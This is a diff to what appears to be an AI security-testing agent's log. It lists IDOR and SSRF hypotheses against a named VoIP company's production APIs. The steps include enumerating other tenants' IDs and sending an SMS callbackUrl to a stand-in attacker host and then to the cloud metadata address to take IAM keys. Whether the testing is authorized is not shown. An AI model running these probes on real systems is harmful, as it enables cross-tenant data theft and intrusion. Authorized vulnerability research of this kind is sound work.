@@ -181,3 +181,38 @@ evidence_needed: valid token + cross-tenant identifier read
 verify_steps: blocked on valid bearer token (401 confirmed live)
 impact: Cross-tenant PBX takeover, routing/billing fraud; severity CRITICAL
 testability: HUMAN_ONLY
+## 2026-09-04 05:05:59 UTC [target] (model bigpickle)
+[HYP] IDOR/BOLA on configuration-api tenant-scoped {identifier} resources
+class: IDOR
+asset: configuration-api.peoplefone.com/customer/voip/v1/{users,numbers,virtualUsers}/{identifier}
+confidence: 78
+reasoning: 235KB OpenAPI exposes extensive PBX config CRUD keyed by {identifier} path params; spec explicitly states "user must be part of the account bound to the bearer token" confirming authorization boundary; numeric identifiers likely sequential; bearer token validates token validity but object-level authorization unproven
+evidence_needed: Valid bearer token from tenant A returns data for tenant B's {identifier}
+verify_steps: GET https://configuration-api.peoplefone.com/services/api-doc/ (capture full spec); with valid token GET /customer/voip/v1/virtualUsers/{own_id}/callforwarding then test neighbor/sequential IDs
+impact: Cross-tenant PBX takeover — call forwarding, user extensions, routing, phone numbers, IVR; severity CRITICAL
+testability: HUMAN_ONLY
+[HYP] BOLA on SMS messageId (cross-tenant SMS disclosure)
+class: IDOR
+asset: api.peoplefone.com/customer/sms/v1/sms/messages/{messageId}
+confidence: 75
+reasoning: SMS API documented as "free for all developers"; GET /messages/{messageId} and /status/{messageId} return full content+recipient on path-id; messageIds likely sequential/UUIDv4; if authorization is per-token-only without tenant isolation, authenticated attacker can enumerate other tenants' SMS (PII: phone numbers, message text)
+evidence_needed: messageId format/predictability from valid token responses; whether response is scoped to token's tenant
+verify_steps: GET https://api.peoplefone.com/services/api-doc/ (capture spec for messageId schema); with valid bearer token GET /customer/sms/v1/sms/messages to analyze messageId format; test neighbor IDs
+impact: Cross-tenant PII/SMS disclosure — phone numbers, message content, delivery status; severity HIGH/CRITICAL
+testability: AUTH_HELPED
+[HYP] SSRF via SMS callbackUrl and Smart Routing webhook url
+class: SSRF
+asset: api.peoplefone.com/customer/sms/v1/sms/messages (callbackUrl) + call-api.peoplefone.com SmartRouting webhook
+confidence: 68
+reasoning: POST /v1/sms/messages accepts callbackUrl (maxLength 2048), spec callbacks bind to {$request.body#/callbackUrl} meaning server POSTs event to attacker URL; Smart Routing webhook registers arbitrary url; if no internal-IP/denylist validation (169.254.169.254, localhost, private ranges), post-auth SSRF to cloud metadata or internal SIP/PBX services
+evidence_needed: Whether callback user-agent reaches external host; whether internal/private/loopback/169.254.169.254 blocked; metadata reachability
+verify_steps: With valid token POST /customer/sms/v1/sms/messages with callbackUrl=https://attacker-collab.host/callback (observe if callback received); if yes, test http://169.254.169.254/latest/meta-data/
+impact: Cloud metadata/IAM keys theft, internal network pivot to SIP/PBX/internal APIs; severity CRITICAL
+testability: AUTH_HELPED
+[NEXT] PROBE: GET https://api.peoplefone.com/services/api-doc/ (read-only, capture full response body for OpenAPI/Swagger spec — extract token issuance endpoint, messageId schema, callbackUrl validation constraints, auth scheme)
+[LEARN] REJECTED AUTH @ auth.peoplefone.com: Standard OAuth endpoints return 404; authorize endpoint not at standard path; BLOCKED for automation
+[LEARN] ACCEPTED IDOR @ configuration-api.peoplefone.com: 235KB spec with explicit authorization boundary notes + {identifier} CRUD — confirmed CRITICAL BOLA candidate
+[LEARN] ACCEPTED IDOR @ api.peoplefone.com: SMS messageId endpoint surface confirmed in spec — cross-tenant disclosure viable if tenant isolation absent
+[LEARN] ACCEPTED SSRF @ api/call-api: callbackUrl + Smart Routing webhook spec-confirmed SSRF vectors — needs token to verify internal-IP blocking
+[LEARN] REJECTED MISCONFIG @ *.peoplefone.com: Swagger UI protected by 401 on real backends; unauthenticated docs are by-design dev portal
+[RISK] peoplefone GmbH: 85/100 — Large VoIP/SaaS estate (SMS, PBX config, call control) with three confirmed CRITICAL-severity hypothesis classes pending token acquisition; exposed Swagger documents full attack surface; "free for all developers" lowers barrier to valid token; auth bypass blocked but IDOR/SSRF are automatable once credentialed. Primary gap: token issuance path unknown from spec.
